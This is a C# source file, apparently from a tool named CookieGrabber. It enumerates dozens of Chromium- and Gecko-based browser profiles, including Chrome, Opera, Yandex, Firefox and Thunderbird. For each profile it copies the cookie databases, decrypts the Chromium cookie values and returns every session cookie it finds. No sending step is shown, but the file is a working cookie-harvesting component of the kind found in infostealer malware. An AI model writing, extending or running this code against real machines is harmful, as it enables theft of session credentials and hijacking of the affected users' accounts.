using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace CookieGrabber
{
    public static class CookieTool
    {
        static string local = Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\",
            roaming = Environment.GetEnvironmentVariable("APPDATA") + "\\";
        public const string ChromiumUserProfile = "\\User Data\\Default",
            GeckoUserProfiles = "\\Profiles",
            ChromiumCookiePath = "\\Cookies",
            GeckoCookiePath = "\\cookies.sqlite";

        public static readonly string[] ChromiumBasedBrowserPaths = new string[]
        {
            local + "Google\\Chrome" + ChromiumUserProfile,
            local + "Google(x86)\\Chrome" + ChromiumUserProfile,
            local + "Chromium" + ChromiumUserProfile,
            roaming + "Opera Software\\Opera Stable",
            local + "BraveSoftware\\Brave-Browser" + ChromiumUserProfile,
            local + "Epic Privacy Browser" + ChromiumUserProfile,
            local + "Amigo" + ChromiumUserProfile,
            local + "Vivaldi" + ChromiumUserProfile,
            local + "Orbitum" + ChromiumUserProfile,
            local + "Mail.Ru\\Atom" + ChromiumUserProfile,
            local + "Kometa" + ChromiumUserProfile,
            local + "Comodo\\Dragon" + ChromiumUserProfile,
            local + "Torch" + ChromiumUserProfile,
            local + "Comodo" + ChromiumUserProfile,
            local + "Slimjet" + ChromiumUserProfile,
            local + "360Browser\\Browser" + ChromiumUserProfile,
            local + "Maxthon3" + ChromiumUserProfile,
            local + "K-Melon" + ChromiumUserProfile,
            local + "Sputnik\\Sputnik" + ChromiumUserProfile,
            local + "Nichrome" + ChromiumUserProfile,
            local + "CocCoc\\Browser" + ChromiumUserProfile,
            local + "uCozMedia\\Uran" + ChromiumUserProfile,
            local + "Chromodo" + ChromiumUserProfile,
            local + "Yandex\\YandexBrowser" + ChromiumUserProfile
        };

        public static readonly string[] GeckoBasedBrowsersList = new string[]
        {
            roaming + "Mozilla\\Firefox" + GeckoUserProfiles,
            roaming + "Waterfox" + GeckoUserProfiles,
            roaming + "K-Meleon" + GeckoUserProfiles,
            roaming + "Thunderbird" + GeckoUserProfiles,
            roaming + "Comodo\\IceDragon" + GeckoUserProfiles,
            roaming + "8pecxstudios\\Cyberfox" + GeckoUserProfiles,
            roaming + "NETGATE Technologies\\BlackHaw" + GeckoUserProfiles,
            roaming + "Moonchild Productions\\Pale Moon" + GeckoUserProfiles
        };

        public delegate bool CookieSelector(string name, byte[] rawValue, DateTime createdAt, DateTime expiresAt, string host, string path, bool isSecure);
        public static readonly CookieSelector EmptySelector = (_, __, ___, ____, _____, ______, _______) => true;

        #region Public Methods
        public static Cookie[] GetGeckoCookies(CookieSelector selector)
        {
            Cookie[] cookies = null;

            foreach (var profiles in GeckoBasedBrowsersList)
            {
                if (!Directory.Exists(profiles))
                    continue;
                foreach (var path in Directory.GetDirectories(profiles))
                {
                    var cookiePath = path + GeckoCookiePath;
                    if (!File.Exists(cookiePath))
                        continue;
                    if (File.Exists(cookiePath + "cbtemp"))
                        File.Delete(cookiePath + "cbtemp");

                    File.Copy(cookiePath, cookiePath + "cbtemp");
                    cookiePath += "cbtemp";

                    var sqlite = new SQLite(cookiePath);
                    sqlite.ReadTable("moz_cookies");

                    for (int i = 0; i < sqlite.GetRowCount(); i++)
                    {
                        string name = sqlite.GetString(i, 2);
                        if (name == null)
                            continue;

                        string host = sqlite.GetString(i, 4);
                        string cpath = sqlite.GetString(i, 5);
                        bool isSecure = sqlite.GetBool(i, 9);
                        byte[] rawValue = sqlite.GetValue(i, 3);
                        // 1608049296 => unix timestamp
                        // 1608048813 *804000* => / 10^6
                        DateTime expiresAt = new DateTime(1970, 1, 1).AddSeconds(sqlite.GetUInt(i, 6));
                        DateTime createdAt = new DateTime(1970, 1, 1).AddSeconds(sqlite.GetULong(i, 8) / Math.Pow(10, 6));

                        if (selector(name, rawValue, createdAt, expiresAt, host, cpath, isSecure))
                            cookies = AddEnd(cookies, new Cookie(name, sqlite.Encoding.GetString(rawValue), createdAt, expiresAt, host, cpath, isSecure) { CookieFilePath = path + GeckoCookiePath });
                    }

                    File.Delete(cookiePath);
                }
            }

            return cookies;
        }

        public static Cookie[] GetChromiumCookies(CookieSelector selector)
        {
            Cookie[] cookies = null;

            foreach (var path in ChromiumBasedBrowserPaths)
            {
                var cookiePath = path + ChromiumCookiePath;
                if (!Directory.Exists(path) || !File.Exists(cookiePath))
                    continue;
                if (File.Exists(cookiePath + "cbtemp"))
                    File.Delete(cookiePath + "cbtemp");

                File.Copy(cookiePath, cookiePath + "cbtemp");
                cookiePath += "cbtemp";

                var valueDecryptor = new ValueDecryptor(path);
                var sqlite = new SQLite(cookiePath);
                sqlite.ReadTable("cookies");

                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    string name = sqlite.GetString(i, 2);
                    if (name == null)
                        continue;

                    string host = sqlite.GetString(i, 1);
                    string cpath = sqlite.GetString(i, 4);
                    bool isSecure = sqlite.GetBool(i, 6);
                    byte[] rawValue = sqlite.GetValue(i, 12);
                    DateTime expiresAt = ConvertTimestamp(sqlite.GetULong(i, 5));
                    DateTime createdAt = ConvertTimestamp(sqlite.GetULong(i, 0));

                    if (selector(name, rawValue, createdAt, expiresAt, host, cpath, isSecure))
                        cookies = AddEnd(cookies, new Cookie(name, valueDecryptor.DecryptValueChrome(rawValue), createdAt, expiresAt, host, cpath, isSecure) { CookieFilePath = path + ChromiumCookiePath });
                }

                File.Delete(cookiePath);
            }

            return cookies;
        }

        public static Cookie[] GetAllCookies(CookieSelector selector)
        {
            var d = AddEnd(GetChromiumCookies(selector), GetGeckoCookies(selector));
            return d;
        }

        public static Cookie[] GetAllCookies()
        {
            return AddEnd(GetChromiumCookies(EmptySelector), GetGeckoCookies(EmptySelector));
        }

        public static Cookie[] GetCookiesByKey(string name, DateTime? expiredAfter = null)
        {
            if (expiredAfter == null)
                return GetAllCookies((n, _, __, ___, ____, _____, ______) => n == name);
            else
                return GetAllCookies((n, _, __, ea, ___, ____, _____) => n == name && ea > expiredAfter);
        }

        public static Cookie GetNewestCookieByKey(string name)
        {
            return GetAllCookies((n, _, __, ___, ____, _____, ______) => n == name)?.OrderByDescending(cookie => cookie.CreatedAt).FirstOrDefault();
        }
        #endregion

        #region Private Methods
        static Cookie[] AddEnd(Cookie[] arr, params Cookie[] range)
        {
            if (arr == null)
                return range;
            if (range == null)
                return arr;

            var arrorig = arr.Length;
            Array.Resize(ref arr, arr.Length + range.Length);
            for (var i = 0; i < range.Length; i++)
                arr[i + arrorig] = range[i];
            return arr;
        }

        static DateTime ConvertTimestamp(ulong expiry)
        {
            // 9223372036854775807 => long.MaxValue
            // 13236437777840111 => true value
            return TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * (long)expiry), TimeZoneInfo.Local);
        }
        #endregion
    }
}
